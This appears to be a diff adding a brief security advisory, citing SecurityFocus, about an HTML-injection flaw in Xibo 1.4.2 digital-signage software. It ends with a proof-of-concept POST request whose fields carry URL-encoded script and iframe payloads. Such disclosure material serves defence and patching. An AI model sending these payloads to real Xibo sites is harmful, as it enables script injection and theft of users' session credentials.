@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/62063/info
+
+Xibo is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input.
+
+Attacker-supplied HTML and script code could be executed in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user; other attacks are also possible.
+
+Xibo 1.4.2 is vulnerable; other versions may also be affected. 
+
+POST: /index.php?p=layout&q=add&ajax=true
+
+Data: layoutid=0&layout=Gimppy%3Cimg+src%3D42+onerror%3D'alert(%22InfoSec42%22)'%3E&description=%3Ciframe+src%3D'http%3A%2F%2Fsecurityevaluators.com'+width%3D1000+height%3D1000%3C%2Fiframe%3E&tags=&templateid=0 
